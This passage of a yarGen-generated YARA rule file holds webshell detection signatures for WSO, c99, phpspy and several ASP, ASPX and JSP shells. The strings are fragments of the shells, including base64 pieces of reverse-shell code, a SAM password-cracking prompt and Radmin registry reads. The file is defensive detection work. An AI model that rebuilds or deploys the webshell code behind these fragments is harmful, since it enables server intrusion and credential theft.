rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_275 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "if(!empty($_SERVER['HTTP_USER_AGENT'])) {" fullword ascii
      $s2 = "$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));" fullword ascii
      $s3 = "if(in_array($_POST['p1'], $stringTools))" fullword ascii
      $s4 = "if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));" fullword ascii
      $s5 = "if(@$_POST['p3'])" fullword ascii
      $s6 = "if(substr($path, -1) != '/')" fullword ascii
      $s7 = "'BIN to HEX' => 'binhex'," fullword ascii
      $s8 = "echo\"</pre></div><br><h1>Search files:</h1><div class=content>" fullword ascii
      $s9 = "<tr><td>Path:</td><td><input type='text' name='cwd' value='\". htmlspecialchars($GLOBALS['cwd']) .\"' style='width:100%'></td></" ascii
      $s10 = "if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));ret" ascii
      $s11 = "$path.='/';" fullword ascii
      $s12 = "urn strtoupper($r);}}" fullword ascii
      $s13 = "<tr><td>Path:</td><td><input type='text' name='cwd' value='\". htmlspecialchars($GLOBALS['cwd']) .\"' style='width:100%'></td></" ascii
      $s14 = "if(is_array($paths)&&@count($paths)) {" fullword ascii
      $s15 = "if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));ret" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c99v2_c99_locus7s_276 {
   meta:
      description = "webshell - from files c99_PSych0.php, c99v2.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $s1 = "      header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\"); " fullword ascii
      $s2 = "     $result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword ascii
      $s3 = "    header(\"Content-type: \".$inf[\"mime\"]); " fullword ascii
      $s4 = " foreach($sess_data[\"copy\"] as $k=>$v) {$sess_data[\"copy\"][$k] = str_replace(\"\\\\\",DIRECTORY_SEPARATOR,realpath($v));} " fullword ascii
      $s5 = " foreach($sess_data[\"cut\"] as $k=>$v) {$sess_data[\"cut\"][$k] = str_replace(\"\\\\\",DIRECTORY_SEPARATOR,realpath($v));} " fullword ascii
      $s6 = " elseif (($mode & 0x8000) === 0x8000) {$t = \"-\";} " fullword ascii
      $s7 = "      $sql = \"INSERT INTO `$tab`(`\".$keys.\"`) VALUES ('\".$values.\"');\\n\"; " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99shell_Shell__ci___Biz_was_here_c99_277 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "  else {echo \"<b><font color=green>You can crack winnt passwords. <a href=\\\"\".$surl.\"act=f&f=sam&d=\".$_SERVER[\"WINDIR\"]." ascii
      $s2 = "r&ft=download\\\"><u><b>Download</b></u></a>, and use lcp.crack+ " fullword ascii
      $s3 = "b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"fi" ascii
      $s4 = "b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"" ascii
      $s5 = " ?></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input" ascii
      $s6 = "e=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><?ph" ascii
      $s7 = "ut type=\"text\" name=\"mkdir\" size=\"50\" value=\"<?php echo $dispd; ?>\">&nbsp;<input type=submit value=\"Create\"><br><?php " ascii
      $s8 = "=\"<?php echo $surl; ?>\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"<?php echo $dispd; ?" ascii
      $s9 = "orm action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"<?php ech" ascii
      $s10 = ">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File " ascii
      $s11 = "d; ?>\"><input type=\"text\" name=\"f\" size=\"50\" value=\"<?php echo $dispd; ?>\">&nbsp;<input type=submit value=\"Go\"></form" ascii
      $s12 = "dden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"<?php echo $dispd; ?>\"><input type=\"text\" name=\"mkfile" ascii
      $s13 = "<?php echo $surl; ?>\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"<?php echo $" ascii
      $s14 = "cho $dispd; ?>\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"sear" ascii
      $s15 = "\" value=\"<?php echo $dispd; ?>\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _xslt_a1_a_278 {
   meta:
      description = "webshell - from files xslt.aspx, a1.aspx, a.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "856f45ee3c3cb1f86285f7fe788e3ef7e8bb6f7f79b3aa839a95adde88a09de8"
      hash2 = "aaee2187c1577cebb97cd0fc985c6a3b86bcf5db92cdf284f3fb1a598139d466"
      hash3 = "ef59322c0709c224cb2d4fa6c117ddf20dc85e77194e4bba86840727ba965c04"
   strings:
      $s1 = "<xsl:template match=\"\"/root\"\">" fullword ascii
      $s2 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
      $s3 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s4 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
      $s5 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
      $s6 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
      $s7 = "xsldoc.LoadXml(xslt);" fullword ascii
      $s8 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
      $s9 = "xmldoc.LoadXml(xml);" fullword ascii
      $s10 = "XmlDocument xsldoc=new XmlDocument();" fullword ascii
      $s11 = "\" xmlns:zcg=\"\"zcgonvh\"\">" fullword ascii
      $s12 = "</xsl:stylesheet>\";" fullword ascii
      $s13 = "XmlDocument xmldoc=new XmlDocument();" fullword ascii
      $s14 = "b77a5c561934e089" ascii /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them )
      ) or ( all of them )
}

rule _mysql_mysql_279 {
   meta:
      description = "webshell - from files mysql.jsp, mysql.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bf3ef85a52279d08e94f52d4136dd4817dac76bd11ce8df931311d5aecac946f"
      hash2 = "709925f24268dcfe93d666d210b38ddee557bfd08b13744426b4fc44ce955008"
   strings:
      $s1 = "        rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
      $s2 = "                if (col == rsmd.getColumnCount())" fullword ascii
      $s3 = "                    bw.append(rs.getString(col));" fullword ascii
      $s4 = "                if (rs.getString(col) == null)" fullword ascii
      $s5 = "            for (int col = 1; col <= rsmd.getColumnCount(); col++) {" fullword ascii
      $s6 = "        rsmd = rs.getMetaData();" fullword ascii
      $s7 = "            bw.append(\"INSERT INTO \" + table + \" VALUES(\");" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 8KB and ( all of them )
      ) or ( all of them )
}

rule _job_ha_520_ma1_280 {
   meta:
      description = "webshell - from files job.jsp, ha.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash2 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash3 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash4 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "          <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
      $s2 = "theform.__EVENTTARGET.value = eventTarget.split(\"$\").join(\":\");" fullword ascii
      $s3 = "function __doPostBack(eventTarget, eventArgument) {" fullword ascii
      $s4 = "theform.submit();" fullword ascii
      $s5 = "if (window.navigator.appName.toLowerCase().indexOf(\"microsoft\") > -1) {" fullword ascii
      $s6 = "var theform;" fullword ascii
      $s7 = "theform = document.forms[\"Form1\"];" fullword ascii
      $s8 = "<td>&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
      $s9 = "theform.__EVENTARGUMENT.value = eventArgument;" fullword ascii
      $s10 = "theform = document.Form1;" fullword ascii
      $s11 = "if\" color=\"#ffffff\"><b>" fullword ascii
      $s12 = "\" class=\"button\" />&nbsp;<input type=\"reset\" value=\"" fullword ascii
      $s13 = "&nbsp;&nbsp;<input type=\"text\" size=\"80\" name=\"curPath\" class=\"textbox\" value=\"<%=curPath%>\" />" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_D_____ASP__wt_asp__1___vps___281 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, D -  [ASP].asp, wt.asp, asp (1).asp, .asp, vps.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
      hash4 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
      hash5 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "NoCheckTemp = (Request(\"NoCheckTemp\")=\"on\")" fullword ascii
      $s2 = "response.Flush" fullword ascii
      $s3 = "if Session(\"paths\")<>\"\" then  Paths_str=Session(\"paths\")" fullword ascii
      $s4 = "Session(\"paths\") = Request(\"Paths\")" fullword ascii
      $s5 = "if Request(\"Paths\") =\"\" then" fullword ascii
      $s6 = "CheckNextDir = (Request(\"CheckNextDir\")=\"on\")" fullword ascii
      $s7 = "For i=LBound(PathsSplit) To UBound(PathsSplit) " fullword ascii
      $s8 = "</label>\"" fullword ascii
      $s9 = "ShowNoWriteDir = (Request(\"ShowNoWrite\")=\"on\")" fullword ascii
      $s10 = "PathsSplit=Split(Request(\"Paths\"),chr(13)&chr(10)) " fullword ascii
      $s11 = "CheckFile = (Request(\"CheckFile\")=\"on\")" fullword ascii
      $s12 = "ShowDirWrite_Dir_File Trim(PathsSplit(i)),CheckFile,CheckNextDir" fullword ascii
      $s13 = "if instr(PathsSplit(i),\":\")>0 then" fullword ascii
      $s14 = "]<br>\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x483c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1____2012____1__r00tsFSO_282 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, .asp, _2012.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash6 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash9 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Set WSH= Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
      $s2 = "PortArray=WSH.REGREAD(RadminPath & Port )" fullword ascii
      $s3 = "<input name='SFpath' value='\" & WWWRoot & \"' style='width:390'>&nbsp;" fullword ascii
      $s4 = "Port = \"Port\"" fullword ascii
      $s5 = "ParameterArray=WSH.REGREAD(RadminPath & Parameter )" fullword ascii
      $s6 = "RadminPath=\"HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\\"" fullword ascii
      $s7 = "Parameter=\"Parameter\"" fullword ascii
      $s8 = "strObj = strObj & Hex(ParameterArray(i))" fullword ascii
      $s9 = "If IsArray(ParameterArray) Then" fullword ascii
      $s10 = "\"&(timer()-st)*1000&\"" fullword ascii
      $s11 = "For i = 0 To UBound(ParameterArray)" fullword ascii
      $s12 = "strObj = strObj & \"0\"&CStr(Hex(ParameterArray(i)))" fullword ascii
      $s13 = ".</td></tr>\"" fullword ascii
      $s14 = "]</td></tr>\"  " fullword ascii
      $s15 = "' class='submit'>&nbsp;[" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule __2014_NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16__2012_NEW_WebShell_283 {
   meta:
      description = "webshell - from files _2014.asp, NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, _2012.asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash2 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash3 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash4 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash5 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = ">elbat/<" fullword ascii /* reversed goodware string '</table>' */
      $s2 = "redloFevoM" fullword ascii /* reversed goodware string 'MoveFolder' */
      $s3 = "eliFleD" fullword ascii /* reversed goodware string 'DelFile' */
      $s4 = "redloFypoC" fullword ascii /* reversed goodware string 'CopyFolder' */
      $s5 = "eliFevoM" fullword ascii /* reversed goodware string 'MoveFile' */
      $s6 = "eliFypoC" fullword ascii /* reversed goodware string 'CopyFile' */
      $s7 = "ObT(12,0) = \"SmtpMail.SmtpMail.1\"" fullword ascii
      $s8 = "</a></div><br></center>\"" fullword ascii
      $s9 = "eliFtidE" fullword ascii
      $s10 = "'=eltit 'ma'=ssalc ')" fullword ascii
      $s11 = "eliFnwoD" fullword ascii
      $s12 = "  ObT(4,2) = \"" fullword ascii
      $s13 = "  ObT(2,2) = \"ACCESS" fullword ascii
      $s14 = "  ObT(11,2) = \"" fullword ascii
      $s15 = "\",vbCrLf))" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule __r00tsFSO_284 {
   meta:
      description = "webshell - from files .asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash2 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "T1.Write Request.BinaryRead(Request.TotalBytes)" fullword ascii
      $s2 = "Response.ContentType=\"application/octet-stream\"" fullword ascii
      $s3 = "SFV=T2.ReadText" fullword ascii
      $s4 = "TIn=T2.ReadText : T2.Close" fullword ascii
      $s5 = "ID: \"&Session.SessionId()" fullword ascii
      $s6 = "set D1=nothing:set D2=nothing" fullword ascii
      $s7 = "T2.Position=0 : T2.Type=2" fullword ascii
      $s8 = "if InStr (45,TIn,\"filename=\"\"\",1) > 0 then" fullword ascii
      $s9 = "D1.RemoveAll:D2.RemoveAll" fullword ascii
      $s10 = "T3.SaveToFile F,2" fullword ascii
      $s11 = "T3.Mode=3 : T3.Type=1 : T3.Open" fullword ascii
      $s12 = "set T3=nothing" fullword ascii
      $s13 = "Dim D1,D2" fullword ascii
      $s14 = "T3.Close" fullword ascii
      $s15 = "dim T3" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r00ts_php_angel_2008_icesword_spy_2011_2013_2009mssql_285 {
   meta:
      description = "webshell - from files r00ts php.php, angel.php, 2008.php, icesword.php, spy.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dafcd59e326fb8b5d5a54243e4beca182eb230c45e73064ee4acbfd3d302ead"
      hash2 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash5 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash6 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash7 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash8 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "\"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\"." fullword ascii
      $s2 = "\"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\"." fullword ascii
      $s3 = "\"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\"." fullword ascii
      $s4 = "\"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\"." fullword ascii
      $s5 = "$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\"." fullword ascii
      $s6 = "\"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword ascii
      $s7 = "\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\"." fullword ascii
      $s8 = "\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\"." fullword ascii
      $s9 = "\"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";" fullword ascii
      $s10 = "\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\"." fullword ascii
      $s11 = "\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\"." fullword ascii
      $s12 = "\"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\"." fullword ascii
      $s13 = "\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\"." fullword ascii
      $s14 = "\"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\"." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2005_full_PHPSPY_phpspy_2006_lnc_286 {
   meta:
      description = "webshell - from files shell.php, phpspy_2005_full.php, PHPSPY.php, phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash3 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash4 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash5 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = " max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii
      $s2 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s3 = "$upsize=get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"" fullword ascii
      $s4 = "elseif ($_GET['action'] == \"fileperm\") {" fullword ascii
      $s5 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword ascii
      $s6 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \"Yes\" : \"No\";" fullword ascii
      $s7 = "$dis_func = \"No\";" fullword ascii
      $s8 = "echo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";" fullword ascii
      $s9 = "if ($dis_func == \"\") {" fullword ascii
      $s10 = "}//end fileperm" fullword ascii
      $s11 = "@chmod(\"$mkdirs\",0777);" fullword ascii
      $s12 = "$mkdirs=\"$dir/$newdirectory\";" fullword ascii
      $s13 = "}//for" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_287 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
   strings:
      $s1 = "ox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redir" ascii
      $s2 = "echo '</select></label><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.c" ascii
      $s3 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'" ascii
      $s4 = "echo \"</select></label><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER['HTT" ascii
      $s5 = "e=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkb" ascii
      $s6 = "echo \"</select></label><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".(@$_COOKIE[md5($_SERVER['HTT" ascii
      $s7 = "label:before {content:'';right:0; top:0;width:17px; height:17px;background:#1e252e;position:absolute;pointer-events:none;display" ascii
      $s8 = "label:before {content:'';right:0; top:0;width:17px; height:17px;background:#1e252e;position:absolute;pointer-events:none;display" ascii
      $s9 = "Server: <input type='text' name='server' value=\". $_SERVER['REMOTE_ADDR'] .\"> Port: <input type='text' name='port' value='3133" ascii
      $s10 = ".show_errors.checked?1:\\'\\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\\'\\');}\" value=\">>\"> <nobr><in" ascii
      $s11 = "><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='>>'>" fullword ascii
      $s12 = "e=submit value='>>'>" fullword ascii
      $s13 = "{-webkit-appearance:none;-moz-appearance:none;appearance:none;}" fullword ascii
